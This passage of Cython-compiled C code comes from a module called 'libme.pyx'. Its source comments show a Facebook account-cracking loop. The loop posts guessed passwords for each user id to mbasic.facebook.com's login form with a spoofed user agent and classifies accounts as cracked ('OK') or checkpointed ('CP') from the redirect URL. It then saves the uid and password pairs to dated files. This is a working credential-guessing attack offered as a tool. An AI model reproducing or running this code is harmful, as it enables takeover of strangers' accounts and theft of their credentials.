  __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_ok_s_cp_s, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":191
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()             # <<<<<<<<<<<<<<
 * 		for pw in pwx:
 * 			pw= pw.lower()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":192
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			pw= pw.lower()
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 */
  if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
    __pyx_t_1 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_1); __pyx_t_5 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 192, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 192, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 192, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 192, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 192, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 192, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 192, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":193
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 * 			pw= pw.lower()             # <<<<<<<<<<<<<<
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 * 			xo = rex.url
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 193, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 193, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":194
 * 		for pw in pwx:
 * 			pw= pw.lower()
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})             # <<<<<<<<<<<<<<
 * 			xo = rex.url
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_requests); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_post); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_8 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_email, __pyx_v_uid) < 0) __PYX_ERR(0, 194, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 194, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_login_2, __pyx_n_s_submit) < 0) __PYX_ERR(0, 194, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_data, __pyx_t_8) < 0) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 194, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_headers, __pyx_t_8) < 0) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__15, __pyx_t_3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_8);
    __pyx_t_8 = 0;

    /* "libme.pyx":195
 * 			pw= pw.lower()
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 * 			xo = rex.url             # <<<<<<<<<<<<<<
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_url); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 195, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_XDECREF_SET(__pyx_v_xo, __pyx_t_8);
    __pyx_t_8 = 0;

    /* "libme.pyx":196
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 * 			xo = rex.url
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_home, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
    __pyx_t_12 = (__pyx_t_11 != 0);
    if (!__pyx_t_12) {
    } else {
      __pyx_t_10 = __pyx_t_12;
      goto __pyx_L6_bool_binop_done;
    }
    __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_get, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
    __pyx_t_11 = (__pyx_t_12 != 0);
    if (!__pyx_t_11) {
    } else {
      __pyx_t_10 = __pyx_t_11;
      goto __pyx_L6_bool_binop_done;
    }
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_save, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
    __pyx_t_12 = (__pyx_t_11 != 0);
    if (!__pyx_t_12) {
    } else {
      __pyx_t_10 = __pyx_t_12;
      goto __pyx_L6_bool_binop_done;
    }
    __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_actor, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
    __pyx_t_11 = (__pyx_t_12 != 0);
    __pyx_t_10 = __pyx_t_11;
    __pyx_L6_bool_binop_done:;
    if (__pyx_t_10) {

      /* "libme.pyx":197
 * 			xo = rex.url
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 197, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_0_92m_s_s_0_97m, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 197, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 197, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "libme.pyx":198
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 198, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 198, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 198, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_t_7); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 198, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":199
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_date); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_8 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_8);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_n_s_a);
      __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_3, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_8, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_6);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":200
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
 * 				print("\r  \033[0;91m ~> %s|%s\033[0;97m         "%(uid, pw))
 */
      goto __pyx_L4_break;

      /* "libme.pyx":196
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 * 			xo = rex.url
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":201
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;91m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 201, __pyx_L1_error)
    __pyx_t_12 = (__pyx_t_11 != 0);
    if (!__pyx_t_12) {
    } else {
      __pyx_t_10 = __pyx_t_12;
      goto __pyx_L10_bool_binop_done;
    }
    __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_confirm, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 201, __pyx_L1_error)
    __pyx_t_11 = (__pyx_t_12 != 0);
    if (!__pyx_t_11) {
    } else {
      __pyx_t_10 = __pyx_t_11;
      goto __pyx_L10_bool_binop_done;
    }
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_cuid, __pyx_v_xo, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 201, __pyx_L1_error)
    __pyx_t_12 = (__pyx_t_11 != 0);
    __pyx_t_10 = __pyx_t_12;
    __pyx_L10_bool_binop_done:;
    if (__pyx_t_10) {

      /* "libme.pyx":202
 * 				break
 * 			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
 * 				print("\r  \033[0;91m ~> %s|%s\033[0;97m         "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 202, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_0_91m_s_s_0_97m, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 202, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 202, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "libme.pyx":203
 * 			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
 * 				print("\r  \033[0;91m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 203, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 203, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 203, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_t_6); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 203, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":204
 * 				print("\r  \033[0;91m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_date); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_7 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_n_s_a);
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_3, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
